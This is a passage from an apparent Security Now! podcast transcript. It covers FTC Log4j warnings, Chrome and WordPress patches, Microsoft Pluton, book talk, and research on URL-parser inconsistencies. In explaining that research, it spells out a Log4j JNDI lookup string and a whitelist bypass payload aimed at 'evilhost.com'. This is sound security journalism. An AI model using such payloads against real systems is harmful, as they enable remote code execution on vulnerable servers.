They said:  "According to the complaint in Equifax, a failure to patch a known vulnerability irreversibly exposed the personal information of 147 million consumers.  Equifax agreed to pay $700 million to settle actions by the Federal Trade Commission, the Consumer Financial Protection Bureau, and all 50 states.  The FTC intends to use its full legal authority to pursue companies that fail to take reasonable steps to protect consumer data from exposure as a result of Log4j, or similar known vulnerabilities in the future."  So, yikes.  That's a newly aggressive tone from the government side that sort of feels like it's getting a little tired of having companies say, well, it's not our fault.  We had to go home for Christmas.  You know?  Christmas happens.



The FTC added an interesting acknowledgement, perhaps in response to anyone wanting to hold the Log4j authors accountable, which you could imagine would be what some pencil-neck C-Suite guy would say:  "Hey, it's not our fault.  It's their software."  So the FTC closed their blog posting by writing:  "The Log4j vulnerability is part of a broader set of structural issues.  It is one of thousands of unheralded but critically important open source services that are used across a near-innumerable variety of Internet companies.  These projects are often created and maintained by volunteers, who don't always have adequate resources and personnel for incident response and proactive maintenance, even as their projects are critical to the Internet economy."  I thought this was really interesting, that this was in this otherwise very aggressive posting.



They finished:  "This overall dynamic is something the FTC will consider as we work to address the root issues that endanger user security."  In other words, it sounds like they're saying, look, you know, we recognize that this is a thankless job that volunteers are doing for the benefit of all.  And yeah, they make mistakes, but we're not going to hold them responsible.  We're going to, you know, when vulnerabilities are disclosed and widely publicized, and you're told that you can't go home for Christmas, if you do that anyway, and consumers are harmed, you're not going to be able to blame the author of the software.  So wow.



In browser news, Chrome fixed 37 known problems last week.  I'll note in passing that last Wednesday Chrome received its first update of 2022, which moved Chrome to 97.0.4692.71.  The update did not fix, refreshingly, any disclosed zero-day vulnerabilities.  Far as we know there weren't any.  But it did address 37 security-related issues, one of which is rated critical in severity and could be exploited to pass arbitrary code and gain control over a victim's system.  So that baddy is another of the apparently ubiquitous use-after-free bugs, this one having resided in Chrome's storage component.  If exploited, it could have had devastating effects ranging from corruption of valid data to the execution of malicious code on a compromised machine.  So it's a good thing that Chrome auto-updates.  Everybody's is fixed.  I checked mine because my Chrome, as we know, is famously sluggish in updating itself.  But I was happy to see that I was also at .71.  So, good.



Twenty-four out of the total of 37 flaws were reported to Google by external researchers, and they consider their Project Zero initiative to be external, I guess, to the Chromium Project itself because of course as we know Project Zero looks at everything and has helped lots of other non-Google, even Google-competing projects.  The other lucky 13 flaws were flagged as part of Google's own continuous internal security work.  Of the 24 externally reported bugs, 10 were rated high severity, 10 were given medium rating, and the rest were low.



Oh, and the privacy-first Brave browser, I thought it was interesting.  Following up on last week's discussion of DuckDuckGo's continuing dramatic exponential growth, I wanted to also note that the Brave browser's 2021 usage more than doubled from its previous year.  Brave began 2021 with 24.1 million users, those monthly million users, and ended the year with 50.2 million, for a 220% growth during 2021, up 2.2%, or 2.2 times.  And its growth is also exponential since Brave has been more than doubling their user base year after year now for the past five years.



And for those who haven't been following the Brave alternative closely, it's also based upon the now quite common Chromium platform and thus offers nearly all of the features available in the other Chromium browsers, including Chrome and Edge.  But Brave separates itself from them by explicitly not tracking searches or sharing any personal or identifying data with third-party companies like Google or Microsoft.  In addition to its monthly active users, which is what I just quoted, jumping now to above 50 million, Brave is also seeing 15.5 million active users daily, and its mobile browser has received more than 10 million downloads.  So anyway, it's doing great.  And I know, Leo, I've heard you talking about Brave.  I don't know...



LEO:  They were an advertiser for a while, yeah.  The only thing I don't like about Brave is there's this kind of a tenuous attachment to crypto, its own crypto currency.  And I always worry about that these days, you know.  You saw probably Norton 360 now sells a cryptominer.



STEVE:  Oh, my lord.



LEO:  You have a option not to, I guess.  But still it's weird.  And then Avira, which they bought, which is a free antivirus that was very popular, also is now doing that.  So I get nervous when people get in the cryptosphere, like, I don't, you know, I don't know.  I don't know.  But I like Brave a lot.  If you want to use - the reason I'm less bullish on Brave is everybody now makes a Chromium variant, you know, besides Edge.  DuckDuckGo's will be Chromium when they do their browser.  That's going to be one of interest.  I think Brave is great because it's very privacy forward.  I mean, I like Brave.  I just don't - I still use Firefox, weirdly enough.



STEVE:  I do, too.  It's where all my tabs are that I open when I'm pulling the show together.



Since so much of the web is actually just styled WordPress PHP, I thought it was worth noting that the WordPress core code itself has just received an update that might be important.  Well, is, depending upon your configuration.



As we all know, by far WordPress's biggest security headaches arise because WordPress is, by design, a user-extensible platform, and those who are extending it don't necessarily need to be highly skilled in PHP coding or security before offering well-intentioned though horribly insecure add-ons, many of which go on to become highly popular before someone who is highly skilled in PHP and security finally gets around to taking a look at what everyone is using and then immediately sounds the alarm.  Consequently, this podcast is routinely passing along the news that this or that highly used WordPress add-on needs to be updated with the result of professional oversight which it finally received.



But not today.  Today, WordPress itself is in need of some tender loving care.  Yesterday's just-released v5.8.3 is not ultra-critical, but is probably worth getting around to for anyone who's not using WordPress's automatic updating mechanisms, which for the couple years that I was using WordPress I certainly had turned on, being a believer in the need for that.  And it saved me a couple times.  The update to this 5.8.3 eliminates four vulnerabilities, three rated as highly important.



There's CVE-2022-21661, which is a high-severity SQL injection via WP_Query.  It's exploitable via plugins and themes that use WP_Query.  It can and should be applied to versions all the way back to 3.7.37, so that problem's been around for quite a while.



We've got the CVE ending in 21662, also high severity, also with a CVSS of 8.0, so not to be taken lightly.  That one's a cross-site scripting vulnerability allowing authors, which is to say lower privilege users, to add a malicious backdoor - that's not good - or take over a site by abusing post slugs.  The fix also covers WordPress versions all the way back to 3.7.37.



The next one is CVE 21664.  That's the third high-severity flaw, although that CVSS is down to 7.4.  Still ought to get your attention.  It's the second SQL injection, this time via WP_Meta_Query core class. And doesn't go back quite as far, so it was introduced in 4.1.34.



And then lastly the 21663 is a medium severity, down with a CVSS of 6.6, an object injection issue that can only be exploited if an attacker has compromised the admin account.  So not bad, but you get to fix that one when you're fixing all three high-severity problems.



So there have been no reports of any of these ever being seen exploited in the wild.  But WordPress being PHP means that anyone who's inquisitive will be able to quickly determine what the flaws have long been because you just do a dif on the pre-release PHP and the post-release PHP, and you see what they changed.  So they could be used in attacks by somebody so inclined.  So again, while not super critical, definitely worth doing.  And of course CVSSes with an 8 should not be left in place, if given a choice.



Okay, Leo.  What exactly is a "Pluton"?



LEO:  We asked this on Wednesday on Windows Weekly.



STEVE:  Yes.



LEO:  What the hell is that?



STEVE:  There was some discussion.  I had you guys running in the background while I was working on SpinRite.  Pluton is Microsoft's wonderfully named CPU-integrated TPM technology.  Now, the press is deeply confused, and you guys had every right to be confused, about what exactly Pluton is, thanks to Microsoft's own original horribly titled announcement of Pluton back on November 17th of 2020.  The announcement's title was:  "Meet the Microsoft Pluton processor, the security chip designed for the future of Windows PCs."  That's great.  But only after making the significant correction that what Pluton is, is specifically not a security chip.  It's got nothing to do...



LEO:  There's no chip.



STEVE:  ...with security chips.



LEO:  Yeah, okay.



STEVE:  You know.  And that's Pluton's entire point.  Pluton - and yes, I do love saying the word - is Microsoft's silicon design for an on-chip, on-CPU, integrated TPM-equivalent technology.  Microsoft designed the spec and the silicon and has arranged for Intel, AMD and Qualcomm to integrate this core technology directly into their cores.  So the problem with any external physically separate Trusted Platform Module is specifically that it's external and physically separate.  That means that its lines of communication between it and the system's processors is physically accessible on the motherboard's signal traces.



Now, everyone has always known that.  Right?  I mean, the problem is TPMs were never designed to protect against physical attacks.  The idea was that a TPM would be a much better place to store encryption keys than either in firmware somewhere or on the disk, where they could be retrieved by malware.  The TPM was designed as a secure enclave subprocessor where these secret keys could be used without them ever being disclosed. You'd give the TPM a hash of some blob that needed signing, and the TPM would use one of its internal private keys to encrypt the hash without ever exposing any of its keys to the outside world.



But other applications for which the TPM was also used were less secure and securable.  For example, when the TPM is used to hold BitLocker keys, the unlocked BitLocker key must eventually become external to the TPM in order for the system to use it to decrypt the drive while it's in use.  Of course, Microsoft makes the Xbox, and they've been annoyed through the years by having their precious Xbox's security subverted over and over and over by hobbyist owner hackers who, Leo, had the audacity to think that they actually had the right to mess with the hardware that they purchased and owned.  Imagine that.  Can't have any of that  So those days are numbered.  Pluton moves the TPM on-chip, and in doing so it elevates the security provided by the TPM to also include total protection from physical attack.  There will be nothing to attack.



Basically what this means is that our next-generation processors from everybody - Intel, AMD, Qualcomm - they will just have that TPM stuff on chip, built in, not exposed.  And so, for example, in the case of BitLocker, the BitLocker keys being used to decrypt the drive on the fly, they will never lose - they will never leave the silicon.  They will never be exposed.  So it definitely increases security.  Unfortunately, it definitely decreases our ability to do things that we like to do with our Xboxes.  So anyway, that's Pluton.  It is, again, why Microsoft could announce it as a security chip when why they did it was so that it wouldn't be one is beyond me.  But then, you know, Microsoft.



LEO:  So it's what we thought, which is it's software.



STEVE:  No, it's not.  It is silicon.  It is firmware that they designed that they've convinced Intel, AMD, and Qualcomm to make some room for on their silicon dies moving forward.  So it's a processor.  It's like it's a Microsoft-designed security processor that instead of being external, thus exposed, is on the chip.



LEO:  Okay.



STEVE:  And so you can't get to the communications between it and the other cores on the chip because they're all on the same chip.  You'd have to literally pop the lid and get really NSA-ish.



LEO:  Okay.  



STEVE:  But it's not something that Johnny can do in the garage in order to hack his Xbox any longer.



Two quick notes.  I am very much enjoying - I need to tell all of the Security Now! listeners who recommended this - the first of Dennis Taylor's three Bobiverse novels, and I'm pretty certain that I'm going to enjoy the other two as well.  It's a trilogy.  And I'll probably be wishing for more.  Now, I do need to provide a caveat.  They're an entirely different style of writing than either Ryk Brown or Peter Hamilton.  Whereas both Ryk and Peter are consummate and detailed world builders who spend a great deal of time carefully crafting their characters and then placing them into a fully articulated alternate reality, Dennis by comparison just gets right to it.



When you pick up a Peter F. Hamilton novel, you have to be in the proper mood and in no hurry to reach the end because the end will not be in sight for quite some time, as you and I, Leo, have often commented.  And similarly, each of Ryk Brown's Frontiers Saga story arcs spans 15 moderate size, I guess what I would call "chapter novels."  So again, it's all about the journey with those guys.  But Dennis Taylor's Bobiverse novels are fast and breezy.  They're also a quick read.  I just checked, and I was surprised to see that I was already 80% through the first one.  And actually that's before I started waiting for MacBreak Weekly to end.  Now I'm at 85%.  So...



LEO:  That's why we do long shows.  There you go.  Good for you.



STEVE:  It feels like, to me, like we just got started on this book, and it's almost over.  On the other hand, Dennis wastes no time.  I love Peter F. Hamilton's work.  It's definitely right up there among the best science fiction I've ever found.  But Peter would still be talking about the shape of the rivets on the hull and how the micro ablation created by the thin gases of deep interstellar space while moving at near light speed would tend to give them more of an oval shape and flatten them over time.



LEO:  Yeah, no.  Bob doesn't care about that.



STEVE:  No.  Interesting factoid, okay, but not crucial to the plot.



LEO:  Although you and I kind of like that stuff.  Love that, yeah.



STEVE:  I do.  I do.  And in fact I just told my nephew, who is completely loving Ryk Brown's stuff, he's also in the middle of - I'm blanking on the book, the one that we love, "The Martian" guy.



LEO:  "Salvation"?  Oh, oh, oh, the new one, "Project Hail Mary," yes.



STEVE:  Yes.  He's loving "Project Hail Mary."



LEO:  Yeah.



STEVE:  So I told him about the Bobiverse.



LEO:  Yeah.  Andy Weir also likes ablated spheroids and things like that.



STEVE:  Yes, exactly.  So but I did, I also told Evan that it was going to be crucial for him to eventually move to Hamilton.  He's ever read any Peter F. Hamilton.  He's definitely a sci-fi...



LEO:  "Fallen Dragon."  We all agree.  Start with "Fallen Dragon."



STEVE:  Yes.  And I said to them, I said start with "Fallen Dragon," and then "Pandora's Star," followed by "Judas Unchained."  And boy, do you have a long - no hurry.  We're not in any hurry.  But I don't know, you're probably as visual as I am, Leo.  I have those worlds in my head now.



LEO:  Oh, yeah.  That's why I like, honestly, I prefer books to TV and movie sci-fi because you can imagine something so much richer than they could ever put onscreen.



STEVE:  Well, and we've lamented the fact that there's just, I mean, except for "The Expanse," which I'm waiting for to get done so I can cruise through the final season.



LEO:  You like to binge it.  You don't want to watch it week by week.  You're a binger.



STEVE:  Well, but we used to have, like, back in the day, Jean-Luc was flying around.  Like for, what was it, seven years?  There's no good sci-fi now.  I don't, you know...



LEO:  "Foundation" was terrible.  "Invasion" was terrible.



STEVE:  Yeah.



LEO:  "Wheel of Time," which is fantasy, not sci-fi, is worse than terrible.  I'm so frustrated.  So, yeah, yeah.  I think I'm going to stick with the books.  In fact, honestly, I still haven't seen "The Expanse" despite you and many other people recommending it.  But I think I'm going to do the James S.A. Corey novels.



STEVE:  I did first, yes.  Mark Thompson turned me on to them.  He told me that "The Expanse" was in production.  I read the novels first.  It's always the case, oh my god, especially the first episode or two of "The Expanse."  You're like...



LEO:  What the hell?



STEVE:  What the heck is going on?



LEO:  Stacey says, or was it Stacey?  No, no, it was Amy Webb on Sunday said "Turn on the subtitles for sure" because that spacer lingo, it's hard to follow.



STEVE:  Yeah, yeah, yeah, yeah, yeah.  The good news is I tried to get Lorrie into "Firefly," and she looked at it and had the same sort of feeling, like what?  Except that we're now watching - she never watched "Castle."  And I'm a Nathan Fillion fan.



LEO:  I love him, too.  And he's great in "Firefly."



STEVE:  I just think he is so good.  And so...



LEO:  "Firefly," though, was never a book; right?  That was just a TV show, then later movie.



STEVE:  Correct.  And Fox cancelled it.  Like it was barely...



LEO:  I know.  They ruined it.



STEVE:  It didn't even reach adolescence, and they killed it in its crib.



LEO:  But that's to me the exception because I loved that show.  That was a great show.



STEVE:  Yeah.  Well, and what's so fun is that she's now fallen in love with Nathan Fillion.



LEO:  Yeah.  He's great.



STEVE:  So after we get through with "Castle," that went for like eight years and is just, well, it's good writing, then I'm going to be able - she will then be able to do "Firefly" and then of course "Serenity," the movie that was made from it because fans just demanded more.



LEO:  Yeah.  Wasn't it crowd - I think the movie "Serenity" was crowd-funded at first.  And then they finally, they said, all right, we'll make it.  All right.  I think that they raised money to...



STEVE:  Although we might be confusing it with "The Expanse" because remember what was crowd-funded was flying an airplane around the Amazon headquarters in order for Bezos to finally say, okay, okay, fine.



LEO:  Okay.  We'll green-light it.



STEVE:  And he really liked the series, too.  So he decided to pick it up.  And I have to say the last, the ones that Amazon did had a higher level of production.



LEO:  Oh, okay.  See, I haven't even gotten that far.  I've only watched the first five or six episodes of the first season.



STEVE:  It really is good.



LEO:  All right.  I'm going to do the books, and then I'll come back, yeah.



STEVE:  For what it's worth, on the Bobiverse trilogy, 88% of the reviewers on Amazon gave it five stars.  The other 12% gave it four.  Nobody gave it fewer than four.  They're available through Kindle Unlimited.  So if you're a reader, and you're a Kindle Unlimited person, they won't cost you anything.  And again, it's a different kind of style, but sometimes it's just fun to get on with it.  I mean, I've noticed that television shows where a lot happens in an hour, you feel like you got something for your time, instead of like stretching it out for like no good reason.



LEO:  Yeah, yeah, yeah.



STEVE:  Anyway, I am continuing to move forward nicely with SpinRite.  As I have been, I'm focusing upon all of the outlier machines our various testers have managed to throw at it.  And since I'm always working to find a generally applicable generic solution, rather than doing any special casing, so far I have no special casing code in SpinRite, it's getting generally more robust with each success because it'll be able to take things in stride that it's never seen before, which are also weirdos.



LEO:  I think it's time to talk about the subject of the day, URL Parsing.



STEVE:  Indeed.  And I just sent you a text with the link to the SodaStream refill adapter.



LEO:  We were talking before the show about why never, never to buy SodaStream cartridges.  They're overpriced.  Steve has of course a Rube Goldberg invention for making it possible for all of us.



STEVE:  $17 for the little brass gidget that allows you to refill your own SodaStream cartridges.  So definitely a win.



Okay.  URL Parsing Vulnerabilities.  As I mentioned at the top of the show, this week's topic centers around the work of four security researchers, two from SYNK spelled - and I guess all the normal spellings are gone, so SYNK spells their name S-Y-N-K.  And two from Claroty spelled C-L-A-R-O-T-Y.



LEO:  What the what?  Okay.



STEVE:  I know.  They're both in the Northeast U.S., as I mentioned.  They decided to take a closer look at another set of wildly popular and widely used libraries.  Naturally, I mean, URL parsing, come on.  Like everything needs to do that.  Which as a consequence of that would inherently have broad exposure to external attack.  The title of this week's podcast, URL Parsing Vulnerabilities, discloses their wisely chosen, in retrospect, research target and suggests what they did indeed find.  I have a link in the show notes to their 15-page PDF for anyone who wants to dig in deeper than I do, although we're going to be digging in plenty deep.



What they said was, to set the stage:  "The Uniform Resource Locator (URL) is integral to our lives online because we use it for surfing the web, accessing files, and joining video chats.  If you click on a URL or type it into a browser, you're requesting a resource hosted somewhere online.  As a result, some devices such as our browsers, applications, and servers must receive our URL, parse it into its Uniform Resource Identifier (URI) components, for example the hostname, the path, and so forth, and fetch the requested resource.



"The syntax of URLs is complex, and although different libraries can parse them accurately, it is plausible for the same URL to be parsed differently by different libraries.  The confusion in URL parsing can cause unexpected behavior in the software, like a web application, and could be exploited by threat actors to cause denial-of-service conditions, information leaks, or possibly conduct remote code execution attacks.



"In Team82's joint research with SYNK, we examined," they wrote, "16 URL parsing libraries, written in a variety of programming languages, and noticed some inconsistencies" - which is putting it mildly, as we'll see - "with how each chooses to parse a given URL into its basic components.  We categorized the types of inconsistencies into five categories and searched for problematic code flows in web applications and open source libraries that exposed, indeed, a number of vulnerabilities.



"We learned that most of the eight vulnerabilities we found" - and by the way, they all CVEs assigned, I mean, these are real problems - "largely occurred for two reasons.  First, multiple parsers in use."  They said:  "Whether by design or an oversight, developers sometimes use more than one URL parsing library in projects.  Because some libraries may parse the same URL differently, vulnerabilities can be introduced into code.  The second, specification incompatibility."  They said:  "Different parsing libraries are written according to different RFCs or URL specifications, which creates inconsistencies by design.  This also leads to vulnerabilities because developers may not be familiar with the differences between URL specifications and their implications, for example, what should be checked or sanitized."  



I thought that the first case, the probably inadvertent use of different parsers, was really interesting, where developers might make the reasonable, but ultimately incorrect assumption that different areas of their code would decompose input URLs the same way.  And I just, I invented a typical instance of how that could go wrong.  It's not one that we'll be talking about in a second.  But for example, imagine that upon decomposing a URL into its various pieces, those pieces were sized and storage was allocated to fit, but the code wasn't yet ready to fill those buffers.



Then later, when the code was ready, the same URL was again parsed with the URL's component data finally being copied into the previously allocated storage.  The programmer could assume that since the same URL was being parsed both initially and later, the component pieces would naturally be the same size.  But if different URL parser libraries were used, and they interpreted the URL's format in slightly different ways, the allocation might not fit its data, and a buffer overrun might occur, for example.



Their second issue, which they termed "specification incompatibility," is a variation of a fundamental programming challenge that I've spoken of from time to time and also recently.  My term for it is "weak definitions."  If a coder is not absolutely certain what something is, for example a variable represented by a name, that coder, or god help us, some future other coder might come along and use that variable differently because its purpose wasn't made absolutely clear and obvious by its name.  You misname something, you're going to come back later and forget that you, like, while you were coding, you ended up using it differently than you originally thought you were going to because of the name you gave it, which is no longer correct.  And I find myself often going back and fixing names of things when I go, ooh, right, that's not really what it's doing any longer.  I'd better fix that now.



So in fact we have another example of the URL parsing duality dilemma right in our own backyard with Log4j.  During our final podcast of 2021, we talked about how the Log4j trouble was that a URL of the form jndi:, and then using ldap as the scheme, so ldap:// and then, for example, evilhost.com/a was being parsed from within a log message.  Log4j, upon seeing that URL, would dutifully run out onto the Internet to fetch whatever from wherever.  So, easy to solve this problem; right?  Just create an access whitelist of allowable hosts for that JNDI URL lookup and default the whitelist to only containing a single entry for localhost, which was probably the only valid source for JNDI material to come from anyway; right?  Problem solved.  Nope.



LEO:  No?



STEVE:  Nope.  Not long, and that was the first fix that was offered to this problem.  After that first fix was added, a bypass was found, and it was even awarded a CVE number, 45046, which once again allowed remote JNDI lookup and allowed the vulnerability to be exploited in order to achieve remote code execution.  So how was the clean and simple valid host targets whitelist bypassed?



LEO:  Yeah, how?



STEVE:  The new hack to bypass the whitelist used a URL of the following form.  And this actually worked.  It used ldap://127.0.0.1.



LEO:  Localhost, yeah.



STEVE:  Localhost.  #.evilhost.com:1389/a.  Believe it or not, tucked inside the Log4j code are two different URL parsers.  I kid you not.  One parser is only used for validating the URL, whereas another is used for fetching it.  In order to validate that the URL's host was allowed, Java's built-in URI class is used.  Java's built-in URI class parsed the URL, extracted the URL's host (127.0.0.1) and checked if the host is inside the whitelisted set of allowed hosts.  And indeed, if we parse the URL...



LEO:  Yeah, yeah, fine.



STEVE:  Yeah.  No, no problem.



LEO:  Now you take it from here.



STEVE:  Right.  However, it was discovered that when the JNDI lookup process actually goes to fetch this URL, it does not fetch it from 127.0.0.1.  Instead, it parses URLs differently.  It makes a request to 127.0.0.1#.evilhost.com  in other words, the subdomain of evilhost.com.  Again, 127.0.0.1#.evilhost.com, which is exactly what the bad guys figured out they could do.  So after being initially shut down by the update, which added the whitelist, because after all we wouldn't want to simply remove some dangerous and completely unneeded functionality from Log4j, oh, heavens no.



LEO:  Oh, heaven forfend, yeah.



STEVE:  Uh-huh.  The bad guys simply tweaked their evilhost.com server to reply to subdomain queries, and they were back up and hacking.  And as we know, that dangerous and completely unneeded functionality was finally disabled by default after, what, the fifth try at fixing the Log4j vulnerability.



Okay.  So what's relevant for us today is that this just actually happened in the very real world, that is, this Log4j thing.  We just saw a URL parsing being done differently in two different places, actually causing a real-world problem.  Okay.  So what did this new team turn up when they really dug into this?



They said:  "Throughout our research, we examined 16 URL parsing libraries including:  urllib, a Python library; urllib3, also Python; rfc3986, which is the name of a Python RFC, a URL parsing library; httptools in Python; curl lib in cURL; Wget; the Chrome browser itself; Uri, which is a .NET library; URL in caps, which is a Java library; URI, a Java library; parse_url, which is a PHP library; lowercase url, which is a NodeJS library; url-parse, also NodeJS, net/URL, which is written in Go; uri lowercase in Ruby and URI uppercase for Perl."



So, yeah.  As I said, URLs are everywhere, and there are 16 different parsing libraries.  No two of them do the same thing, despite the fact that they're all trying to do the same thing.  



They said:  "We found five categories of inconsistencies:  scheme confusion; slashes confusion; backslash confusion, which is different from slashes confusion; URL encoded data confusion; and scheme mix-up."  They said:  "We were able to translate these inconsistencies into five classes of vulnerabilities: server-side request forgery, cross-site scripting, open redirect, filter bypass, and denial of service.  In some cases, these vulnerabilities could be exploited further to achieve a greater impact, including remote code execution."  And they finished:  "Eventually, based on our research and the code patterns we searched, we discovered eight vulnerabilities in existing web applications and third-party libraries written in different languages used by many popular web applications."



Okay.  All eight of those have been assigned, as I said, CVEs because, as we'll see, they're really not good.  After digging through all of those libraries and the applications that use them, they found, as I mentioned earlier, five different situations where most, as they put it, of the URL parsers behave unexpectedly.  And that's the scheme confusion, slash confusion, backslash confusion, URL encoded data confusion, and scheme mix-up.



When we're not sure what we want or where we're going, it's often difficult to create a specification for that mission, which is fuzzy, beforehand.  And probably nowhere has this proven to be more true than for the exacting definition of the format of the URL.  The trail of obsoleted and abandoned URL RFCs, the formal specifications of things, speaks volumes.  The original URL RFC was 1738, and it was updated by 1806, 2368, 2396, 3986, 6196, 6270, and 8089.  And along the way it was obsoleted by 4248 and 4266.  Then you have the RFC for the more generic URI.  It also updates the original 1738, obsoletes 2732, 2396, and 1808, and is then itself updated by 6874, 7320, and 8820.  So imagine being a coder who's trying to decide how to handle every possible curve that somebody might either accidentally or maliciously toss down the throat of your URL interpreter.



And as if all that weren't enough, there's also the WHATWG, which is W-H-A-T-W-G, and their TWUS, which is T-W-U-S.  WHATWG, that is, W-H-A-T-W-G, is the Web Hypertext Application Technology Working Group (WHATWG), a community founded by well-meaning individuals, I'm sure, from leading and technology companies, who have tried to create an updated, true-to-form URL specification and URL parsing primitive because the final RFC, eh, we're not - we don't know.



This resulted in the TWUS, the WHATWG URL Specification (TWUS).  While it's not very different from the most up-to-date URL RFC, which we left off at 3986, minor differences do exist.  For example, while the RFC differentiates between backslashes and forward slashes, where forward slashes are treated as a delimiter inside a path component, and backslashes are a character with no reserved purpose, WHATWG's specification states that backslashes should be converted to slashes, and then be treated the same as.  WHATWG's rationale is that this is what most web browsers do.  Browsers, it turns out, treat forward and backslashes identically.  And we'll see later that they do this on purpose.



So WHATWG feels that what they regard as their so-called "living URL standard" should correspond with common practice, rather than being some stodgy old numbered document that isn't what people are doing anyway.  But this "living URL standard" broke compatibility with some existing standards, as we know, and with the contemporary URL parsing libraries that followed.  It turns out these interoperability issues remain one of the primary reasons why many maintainers of some parsing libraries have just said, okay, wait.  We're sticking with the RFC, that being 3986.  Even though they don't do that correctly either, at least their intention was in the right place.



So this brings us to scheme confusion, a confusion involving URLs with missing or malformed schemes.  Of this the team wrote:  "We noticed how almost any URL parser is confused when the scheme component is omitted.  That's because RFC 3986 clearly determines that the only mandatory part of the URL is the scheme" - you have to have that - "whereas previous RFC releases" - that is to say RFC 2396 and earlier - "don't specify it.  Therefore, when it's not present, most parsers get confused."



And the real world behavior they show - this is me talking - is surprising and worrisome.  They asked, these guys, the researchers, asked five different popular Python libraries to parse the schemeless input just google.com/abc.  Most of the parsers, when given the input google.com/abc, state that the host is empty, right, the host being google.com.  Most of the parsers say, eh, you've got no host, while the path they have is google.com/abc, which is wrong, obviously.  However, urllib3 correctly states that the host is Google and the path is /abc, while httptools complains that the supplied URL is invalid.  Okay, because it's really adhering to the spec; right? 



And if you don't have a scheme, RFC 3986 says you're not going anywhere.  When supplied with a schemeless URL, almost no URL parser parses the URL correctly because the URL does not follow the RFC specs.  But most don't complain, they just guess.  And most of them guess differently.  cURL's parser dealt with the missing scheme by providing its own, guessing at what was not provided.  It got the right result, but should it have guessed?  Could there be an abusable downside to such guessing, one might ask?



In their report they then provide a sample bit of Python code to show a real-world example of how a security bypass might occur as a direct result of these parsing differences.  And when I first encountered that, I thought, okay, they've constructed an example, synthetic, of how this would happen.  They use URL split, which is a function imported from the urllib.parse library in order to do the splitting, and then later they use, where is it, netloc in the parsed URL library in order to perform the fetch.  And exactly the problem that we were talking about occurs because in this block of code two different URL parsers are being used.



I learned later that this is actual Python code in a highly used library which is handling these malformed URLs exactly in this wrong way.  And it is used everywhere.  That's unbelievable.  PoolManager is the function in urllib3 which is invoked, and that's like what everybody uses to pull queries across the web.



Okay.  So there's that.  Another oddity they found was in the handling of an irregular number of slashes.  Oh, you're going to love this one, Leo.  They called it "slash confusion."  Now, this is different than which way the slash is leaning.



LEO:  Oh, okay.  All right.



STEVE:  But we get to that next.  That's the backslash confusion.  Slash confusion.  I know, it's unbelievable.  How does any of this actually work?  The controlling RFC 3986 states that a URL authority - okay, now, the authority is the technical term for the domain or the host, what we all call the domain name or the host in the URL.  The actual RFC calls it the "authority."  It states that the authority should start after the scheme, separated by a colon and two forward slashes.



LEO:  Yeah.



STEVE:  Right?  Http://.  How many times have I said that on the podcast?  It should persist, that is, the parsing of the authority should persist until either the parser reaches the end of the line or a delimiter is read, these delimiters being either a slash signaling the start of a path component, a question mark signaling the start of a query, or a hashtag signaling the start of a fragment.



So they played around with URLs beginning with a scheme, a colon, and three or more slashes followed by a domain name and path.  Apparently, the pattern matching that were being used found the :// and thought, ah hah, here comes the domain name.  And when they immediately hit the third slash they thought, ah, and there's the end of the domain name.



LEO:  Oh, my god.



STEVE:  Yes.  Yeah.



LEO:  So is it always - are they using regular expressions to do this?



STEVE:  Yeah, yeah.  And in fact if you scroll down in the show notes to the top of page 13, you'll see the regex which is doing this.



LEO:  Regex is notoriously difficult and easy to screw up.  And this is...



STEVE:  I know.  You have to, I mean, it is, yes, it is super powerful and so easy to have side effects that you don't anticipate.



LEO:  Because the Advent of Code uses regex a lot.  I've been writing a lot of regex lately.  I love regex, and there's a - Jeffrey Friedl's book on "Mastering Regular Expressions" is one of my favorite coding books of all time.



STEVE:  And boy, Leo, can you get yourself some, I mean, it like Forth is a write-only language.



LEO:  Yeah, yeah.  Sometimes they call it the problem with the toothpicks or, yeah.  And it's just it gets crazy with all the escaping in the back because that's part of the problem is backslash is often used to escape.



STEVE:  Yup.



LEO:  And so sometimes you'll have \\\ to escape a backslash.  It gets kind of nutty.



STEVE:  Yeah, in fact you can see in red...



LEO:  There are more modern parsing libraries than regex.



STEVE:  Oh, Leo, nobody should be using it.  You ought to use a careful algorithmic parser in order to take - because, I mean, it is a...



LEO:  Like Parsec or something, yeah.



STEVE:  It is a forward-moving flow with a well-defined structure, you know, follow the proper RFC.



LEO:  The stream, yeah.



STEVE:  Yes, exactly, and treat it that way.  And, well, nobody does.  Sixteen URL parsers, let's write another one.



LEO:  It's the age of the code, too.  I mean, oh, god.



STEVE:  Yeah, I know.



LEO:  And it's also I think this is in some ways an open source problem because...



STEVE:  Yeah, because you don't have to be an expert in order to throw out another URL parser and say, here, Jimmy's URL Parser.



LEO:  Yeah.  And people, this is also a big problem is people just use libraries and assume they're correct.  You should definitely not mix libraries.  That's really funny.  That's really strange.



STEVE:  Yup.  Okay.  So we have the problem that three slashes in a row causes a null host and the authority then to be moved to the beginning of the path.  That actually happens.  Then we have the backslash confusion, a confusion involving URLs containing a backslash.  RFC 3986, the controlling document, clearly specifies that a backslash is an entirely different character from a forward slash and should not be interpreted as one.



LEO:  No.  



STEVE:  This means the URL https://google.com and https:\\google.com are different.



LEO:  Yes.



STEVE:  And should be parsed differently.



LEO:  Yes.



STEVE:  And being true to the RFC, most URL parsers do not treat a slash and a backslash interchangeably.



LEO:  Well, that's a relief.



STEVE:  But our web browsers do.



LEO:  Oh, no.



STEVE:  Yes.  Every web browser, when a URL having backslashes or even a mixture of backward and forward slashes is used in a URL, Chrome and its brethren are completely happy, treating either as forward slashes.



LEO:  So they're assuming maybe that users don't know the difference?



STEVE:  I think that's it.  We might think that this wacky behavior occurs because most browsers follow that WHATWG URL specification which states that backslashes should be treated the same as forward slashes.  But it may be more accurate to say that the TWUS spec follows the browsers rather than the other way around.



LEO:  Yeah, because people, for years, in fact I just saw that TV ad the other day where they said, instead of "slash," they said "backslash."  And just, and nobody caught it.  They just read it that way.  And I think it's because, well, backslashing was created by, I mean, people got used to it because of Windows' horrific use of it.



STEVE:  Oh, my god, and hasn't that been a sin.  Isn't that a sin that has hurt us?



LEO:  Should revisit it.



STEVE:  Whenever I'm spending a lot of time in Unix, and then I come back to Windows, I'm like, okay, wait a minute.



LEO:  Backslashes, yeah.



STEVE:  Which one do I use?



LEO:  Backslashes, oh, god.



STEVE:  Anyway, this code at the top of page 13 shows what the guy did on the second line where he's parsing, he's using a regex to parse out the authority.  He's matching on the - after finding the ://, he then sets up a group in order to grab the authority, and he's pulling together, and you can see it, marked in red, the top of page 13, I think it's a little lower than where you are, or maybe it's above where you are.



LEO:  It's above, yeah.



STEVE:  Yeah.



LEO:  All this backslashing is making me nuts.



